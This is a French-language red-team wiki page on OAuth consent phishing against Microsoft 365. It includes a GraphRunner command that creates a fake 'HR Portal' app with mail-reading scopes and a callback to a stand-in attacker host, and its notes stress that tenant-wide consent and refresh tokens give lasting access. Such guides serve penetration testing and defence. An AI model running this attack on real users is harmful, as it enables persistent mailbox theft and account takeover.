---
title: "Hameçonnage par consentement : l'octroi de consentement illicite"
order: 2
description: "Attaques par octroi de consentement illicite : amener des utilisateurs ou des administrateurs à consentir à une application OAuth malveillante qui capture des jetons avec portées Graph et l'accès à la boîte aux lettres."
keywords:
  - hameçonnage par consentement
  - octroi de consentement illicite
  - application OAuth
  - portées Graph
  - autorisations déléguées
---

# Hameçonnage par consentement

Au lieu de voler un mot de passe, vous enregistrez une application OAuth qui demande des **portées déléguées** Microsoft Graph (courrier, fichiers, accès hors connexion) et vous envoyez à la victime un lien de consentement `login.microsoftonline.com` légitime. Lorsqu'elle consent, l'application reçoit des jetons pour ces portées, ce qui donne un accès durable à sa boîte aux lettres et à ses données, sans identifiant et sans invite MFA par la suite.

## Construire et livrer l'octroi

```powershell
# GraphRunner: stand up a malicious app and generate the consent URL
Invoke-InjectOAuthApp -AppName "HR Portal" -ReplyUrl https://you.example/auth -Scope "Mail.Read offline_access"
# send the resulting https://login.microsoftonline.com/common/adminconsent?... or /authorize link
```

## Notes d'exploitation

- La page de consentement est une véritable interface Microsoft, ce qui rend le leurre efficace ; l'utilisateur accorde l'accès à votre application, pas un identifiant.
- Le consentement administrateur à un rôle d'application accorde des autorisations d'application à l'échelle du locataire, un butin bien plus important que les portées déléguées d'un seul utilisateur.
- Le jeton d'actualisation de l'application maintient l'accès malgré les changements de mot de passe, jusqu'à ce que l'octroi soit révoqué.

## Outils

- **GraphRunner** (`Invoke-InjectOAuthApp`) : injection d'application et URL de consentement.
- **365-Stealer** / **o365-attack-toolkit** : frameworks d'hameçonnage par consentement.

## Références

- [GraphRunner (dafthack)](https://github.com/dafthack/GraphRunner)
- [HackTricks Cloud : hameçonnage par consentement](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [dirkjanm.io : consentement illicite](https://dirkjanm.io/)
